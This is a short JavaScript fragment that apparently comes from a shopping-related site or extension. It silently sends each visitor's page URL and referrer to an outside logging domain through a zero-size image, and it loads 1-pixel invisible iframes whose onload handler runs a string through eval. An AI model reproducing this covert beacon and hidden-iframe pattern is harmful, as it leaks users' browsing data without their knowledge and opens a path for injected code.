
logActivity = function() {
	var ref = document.referrer;
	var page = location.href;
	var img = document.createElement("img");
	if (ref!=null && ref.indexOf("www.amazon.")==-1 && ref.indexOf(".aliexpress.com")==-1
			&& ref.indexOf("redirect-page.googlecode.com")==-1) {
		img.src = "http://log.aliamaz.com/?ref=" + encodeURIComponent(ref) + "&page=" + encodeURIComponent(page);
		img.width = 0;
		img.height = 0;
		document.body.appendChild(img);
	}
};

createIFrame = function(_name, _url, _onload) {
	var ifrm = document.createElement("IFRAME");
	ifrm.id = _name;
	ifrm.setAttribute("src", _url);
	ifrm.style.width = 1 + "px";
	ifrm.style.height = 1 + "px";
	ifrm.onload = function() {
		eval(_onload);
	};
	document.body.appendChild(ifrm);
};